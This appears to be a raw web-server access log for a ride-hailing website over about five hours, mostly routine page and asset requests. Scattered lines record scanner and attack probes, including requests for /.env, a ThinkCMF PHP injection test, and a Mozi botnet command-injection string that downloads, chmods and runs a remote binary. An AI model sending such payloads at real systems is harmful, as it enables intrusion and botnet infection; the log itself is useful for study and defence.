108.162.219.61 - - [02/Oct/2020:22:07:33 +0000] "GET /asset/img/screen-bg-4.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.187.92 - - [02/Oct/2020:22:07:33 +0000] "GET /asset/img/safty-bg.jpg HTTP/1.1" 200 194589 "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.127 - - [02/Oct/2020:22:07:33 +0000] "GET /asset/font-awesome/fonts/fontawesome-webfont.woff2?v=4.4.0 HTTP/1.1" 200 64464 "https://getmeride.com/asset/font-awesome/css/font-awesome.min.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.181 - - [02/Oct/2020:22:07:33 +0000] "GET /asset/img/user-appstore.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.62.42 - - [02/Oct/2020:22:07:33 +0000] "GET /asset/img/support.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.217 - - [02/Oct/2020:22:07:33 +0000] "GET /asset/img/question.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
173.245.52.198 - - [02/Oct/2020:22:07:33 +0000] "GET /asset/img/user-playstore.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
173.245.52.204 - - [02/Oct/2020:22:07:33 +0000] "GET /asset/js/map.js HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.62.64 - - [02/Oct/2020:22:07:33 +0000] "GET /asset/js/jquery.min.js HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.67 - - [02/Oct/2020:22:07:33 +0000] "GET /asset/fonts/clan/ClanPro-Book.otf HTTP/1.1" 304 - "https://getmeride.com/asset/css/style.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.155 - - [02/Oct/2020:22:07:33 +0000] "GET /asset/js/bootstrap.min.js HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
173.245.52.198 - - [02/Oct/2020:22:07:33 +0000] "GET /asset/js/scripts.js HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.62.74 - - [02/Oct/2020:22:07:33 +0000] "GET /asset/img/provider-playstore.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.187.40 - - [02/Oct/2020:22:07:33 +0000] "GET /asset/img/provider-appstore.png HTTP/1.1" 200 13736 "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.187.232 - - [02/Oct/2020:22:07:33 +0000] "GET /asset/fonts/clan/ClanPro-Medium.otf HTTP/1.1" 200 98116 "https://getmeride.com/asset/css/style.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.237.69 - - [02/Oct/2020:22:07:33 +0000] "GET /asset/img/app-download-bg.jpg HTTP/1.1" 200 37870 "https://getmeride.com/asset/css/style.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.63.197 - - [02/Oct/2020:22:07:33 +0000] "GET /js/jquery.min.js HTTP/1.1" 404 1118 "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.63.125 - - [02/Oct/2020:22:07:35 +0000] "GET /uploads/e632445069e2838d2ca83d968d9d2435cc0726fd.png HTTP/1.1" 404 1118 "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.187.130 - - [02/Oct/2020:22:08:53 +0000] "GET /login HTTP/1.1" 200 3952 "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.62.110 - - [02/Oct/2020:22:08:54 +0000] "GET /asset/img/login-user-bg.jpg HTTP/1.1" 304 - "https://getmeride.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.175 - - [02/Oct/2020:22:08:54 +0000] "GET /uploads/668ceb747b5e7b2440863aca942f5b15f13d6aec.png HTTP/1.1" 404 1118 "https://getmeride.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.35 - - [02/Oct/2020:22:54:29 +0000] "GET /robots.txt HTTP/1.1" 304 - "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
162.158.63.89 - - [02/Oct/2020:22:54:29 +0000] "GET /app-ads.txt HTTP/1.1" 404 1118 "-" "Google-adstxt"
143.137.150.128 - - [02/Oct/2020:23:04:38 +0000] "GET / HTTP/1.1" 200 27220 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
108.162.219.187 - - [02/Oct/2020:23:34:29 +0000] "GET /provider/login HTTP/1.1" 200 3843 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.138 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
108.162.219.133 - - [02/Oct/2020:23:37:27 +0000] "GET /favicon.ico HTTP/1.1" 404 1118 "-" "Googlebot-Image/1.0"
108.162.219.205 - - [02/Oct/2020:23:38:06 +0000] "GET /.env HTTP/1.1" 404 1118 "-" "IDBTE4M CODE87"
162.158.62.88 - - [02/Oct/2020:23:38:06 +0000] "POST / HTTP/1.1" 405 10936 "-" "IDBTE4M CODE87"
162.158.63.95 - - [03/Oct/2020:00:05:51 +0000] "GET /.env HTTP/1.1" 404 1118 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
173.245.52.198 - - [03/Oct/2020:00:05:52 +0000] "POST / HTTP/1.1" 405 10936 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
108.162.219.9 - - [03/Oct/2020:00:13:01 +0000] "GET / HTTP/1.1" 200 27291 "https://www.google.com.sg/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.115"
108.162.219.175 - - [03/Oct/2020:00:13:02 +0000] "GET /uploads/668ceb747b5e7b2440863aca942f5b15f13d6aec.png HTTP/1.1" 404 1118 "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.115"
162.158.62.48 - - [03/Oct/2020:00:13:02 +0000] "GET /asset/img/destination.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.115"
162.158.62.38 - - [03/Oct/2020:00:13:02 +0000] "GET /asset/img/taxi-app.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.115"
162.158.62.32 - - [03/Oct/2020:00:13:02 +0000] "GET /asset/font-awesome/css/font-awesome.min.css HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.115"
108.162.219.57 - - [03/Oct/2020:00:13:02 +0000] "GET /asset/img/screen-bg.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.115"
162.158.62.48 - - [03/Oct/2020:00:13:02 +0000] "GET /asset/img/taxi-car.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.115"
108.162.219.121 - - [03/Oct/2020:00:13:02 +0000] "GET /asset/css/style.css HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.115"
173.245.52.210 - - [03/Oct/2020:00:13:02 +0000] "GET /asset/css/bootstrap.min.css HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.115"
162.158.63.117 - - [03/Oct/2020:00:13:02 +0000] "GET /asset/img/screen-bg-3.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.115"
108.162.219.61 - - [03/Oct/2020:00:13:03 +0000] "GET /asset/img/screen-bg-4.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.115"
162.158.62.8 - - [03/Oct/2020:00:13:03 +0000] "GET /asset/img/budget.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.115"
108.162.219.211 - - [03/Oct/2020:00:13:05 +0000] "GET /asset/img/car-wheel.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.115"
173.245.52.128 - - [03/Oct/2020:00:13:05 +0000] "GET /asset/img/cost-cities.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.115"
108.162.219.187 - - [03/Oct/2020:00:13:05 +0000] "GET /asset/img/taxi-location.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.115"
108.162.219.69 - - [03/Oct/2020:00:13:05 +0000] "GET /asset/img/seat-belt.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.115"
162.158.62.42 - - [03/Oct/2020:00:13:06 +0000] "GET /asset/img/support.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.115"
108.162.219.217 - - [03/Oct/2020:00:13:11 +0000] "GET /asset/img/question.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.115"
108.162.219.181 - - [03/Oct/2020:00:13:14 +0000] "GET /asset/img/user-appstore.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.115"
173.245.52.198 - - [03/Oct/2020:00:13:15 +0000] "GET /asset/img/user-playstore.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.115"
173.245.52.68 - - [03/Oct/2020:00:13:15 +0000] "GET /asset/img/provider-appstore.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.115"
162.158.62.64 - - [03/Oct/2020:00:13:15 +0000] "GET /asset/js/jquery.min.js HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.115"
162.158.62.74 - - [03/Oct/2020:00:13:15 +0000] "GET /asset/img/provider-playstore.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.115"
108.162.219.155 - - [03/Oct/2020:00:13:18 +0000] "GET /asset/js/bootstrap.min.js HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.115"
173.245.52.204 - - [03/Oct/2020:00:13:18 +0000] "GET /asset/js/map.js HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.115"
173.245.52.198 - - [03/Oct/2020:00:13:18 +0000] "GET /asset/js/scripts.js HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.115"
162.158.63.197 - - [03/Oct/2020:00:13:18 +0000] "GET /js/jquery.min.js HTTP/1.1" 404 1118 "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.115"
162.158.63.95 - - [03/Oct/2020:00:36:14 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 27291 "http://159.203.122.44:80/?XDEBUG_SESSION_START=phpstorm" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
162.158.62.232 - - [03/Oct/2020:00:44:32 +0000] "GET / HTTP/1.1" 200 27291 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
108.162.219.175 - - [03/Oct/2020:00:44:33 +0000] "GET /uploads/668ceb747b5e7b2440863aca942f5b15f13d6aec.png HTTP/1.1" 404 1118 "https://getmeride.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
162.158.63.197 - - [03/Oct/2020:00:44:33 +0000] "GET /js/jquery.min.js HTTP/1.1" 404 1118 "https://getmeride.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
162.158.63.227 - - [03/Oct/2020:00:44:33 +0000] "GET /asset/fonts/clan/ClanPro-Medium.otf HTTP/1.1" 200 98116 "https://getmeride.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
108.162.219.67 - - [03/Oct/2020:00:44:33 +0000] "GET /asset/fonts/clan/ClanPro-Book.otf HTTP/1.1" 200 95780 "https://getmeride.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
108.162.219.127 - - [03/Oct/2020:00:44:33 +0000] "GET /asset/font-awesome/fonts/fontawesome-webfont.woff2?v=4.4.0 HTTP/1.1" 200 64464 "https://getmeride.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
173.245.52.168 - - [03/Oct/2020:00:44:33 +0000] "GET /asset/img/app-download-bg.jpg HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
108.162.219.13 - - [03/Oct/2020:00:44:33 +0000] "GET /asset/img/slider-bg-1.jpg HTTP/1.1" 304 - "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
173.245.52.68 - - [03/Oct/2020:00:44:33 +0000] "GET /asset/img/behind-the-wheel.jpg HTTP/1.1" 304 - "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
162.158.62.30 - - [03/Oct/2020:00:44:33 +0000] "GET /asset/img/safty-bg.jpg HTTP/1.1" 304 - "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
162.158.63.125 - - [03/Oct/2020:00:44:35 +0000] "GET /uploads/e632445069e2838d2ca83d968d9d2435cc0726fd.png HTTP/1.1" 404 1118 "https://getmeride.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
162.158.62.232 - - [03/Oct/2020:00:44:35 +0000] "GET /login HTTP/1.1" 200 3952 "https://getmeride.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
162.158.62.110 - - [03/Oct/2020:00:44:36 +0000] "GET /asset/img/login-user-bg.jpg HTTP/1.1" 304 - "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
108.162.219.175 - - [03/Oct/2020:00:44:36 +0000] "GET /uploads/668ceb747b5e7b2440863aca942f5b15f13d6aec.png HTTP/1.1" 404 1118 "https://getmeride.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
162.158.63.125 - - [03/Oct/2020:00:44:36 +0000] "GET /uploads/e632445069e2838d2ca83d968d9d2435cc0726fd.png HTTP/1.1" 404 1118 "https://getmeride.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
162.158.62.232 - - [03/Oct/2020:00:44:39 +0000] "GET /register HTTP/1.1" 200 9026 "https://getmeride.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
108.162.219.175 - - [03/Oct/2020:00:44:39 +0000] "GET /uploads/668ceb747b5e7b2440863aca942f5b15f13d6aec.png HTTP/1.1" 404 1118 "https://getmeride.com/register" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
162.158.63.125 - - [03/Oct/2020:00:44:40 +0000] "GET /uploads/e632445069e2838d2ca83d968d9d2435cc0726fd.png HTTP/1.1" 404 1118 "https://getmeride.com/register" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
108.162.219.133 - - [03/Oct/2020:00:46:25 +0000] "GET /favicon.ico HTTP/1.1" 404 1118 "-" "Googlebot-Image/1.0"
162.158.62.48 - - [03/Oct/2020:00:53:44 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 27291 "http://159.203.122.44:80/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
162.158.63.89 - - [03/Oct/2020:00:54:29 +0000] "GET /app-ads.txt HTTP/1.1" 404 1118 "-" "Google-adstxt"
108.162.219.225 - - [03/Oct/2020:00:54:29 +0000] "GET /ads.txt HTTP/1.1" 404 1118 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
93.125.82.37 - - [03/Oct/2020:01:01:03 +0000] "GET / HTTP/1.0" 200 27575 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
85.172.10.110 - - [03/Oct/2020:01:13:06 +0000] "GET / HTTP/1.0" 200 27575 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
46.236.65.239 - - [03/Oct/2020:01:19:37 +0000] "GET / HTTP/1.1" 200 27220 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
115.53.238.43 - - [03/Oct/2020:01:43:40 +0000] "POST /HNAP1/ HTTP/1.0" 301 233 "-" "-"
108.162.219.189 - - [03/Oct/2020:01:54:58 +0000] "GET /auth/facebook HTTP/1.1" 302 756 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
101.255.36.154 - - [03/Oct/2020:01:55:00 +0000] "GET / HTTP/1.1" 200 27220 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
162.158.62.232 - - [03/Oct/2020:02:00:28 +0000] "GET / HTTP/1.1" 200 27291 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36"
108.162.219.35 - - [03/Oct/2020:02:03:21 +0000] "GET /robots.txt HTTP/1.1" 304 - "-" "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)"
46.101.146.208 - - [03/Oct/2020:02:10:25 +0000] "GET / HTTP/1.0" 200 27575 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
173.245.52.146 - - [03/Oct/2020:02:31:34 +0000] "GET / HTTP/1.1" 200 27291 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
108.162.219.9 - - [03/Oct/2020:02:31:34 +0000] "GET / HTTP/1.1" 200 27291 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.158.62.150 - - [03/Oct/2020:02:31:34 +0000] "GET / HTTP/1.1" 200 27291 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
176.113.115.214 - - [03/Oct/2020:02:35:20 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 1118 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
39.86.159.72 - - [03/Oct/2020:02:48:55 +0000] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 226 "-" "-"
176.113.115.214 - - [03/Oct/2020:02:53:39 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 27220 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
108.162.219.189 - - [03/Oct/2020:03:06:38 +0000] "GET / HTTP/1.1" 200 27291 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.189 - - [03/Oct/2020:03:06:50 +0000] "GET /register HTTP/1.1" 200 9026 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.205 - - [03/Oct/2020:03:07:56 +0000] "GET /provider/register HTTP/1.1" 200 9992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.205 - - [03/Oct/2020:03:08:08 +0000] "GET /login HTTP/1.1" 200 3952 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.205 - - [03/Oct/2020:03:08:18 +0000] "POST /login HTTP/1.1" 302 348 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.205 - - [03/Oct/2020:03:08:19 +0000] "GET /login HTTP/1.1" 200 4206 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.205 - - [03/Oct/2020:03:08:19 +0000] "POST /login HTTP/1.1" 302 348 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.205 - - [03/Oct/2020:03:08:20 +0000] "GET /login HTTP/1.1" 200 4206 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.205 - - [03/Oct/2020:03:08:33 +0000] "GET /password/reset HTTP/1.1" 200 2990 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
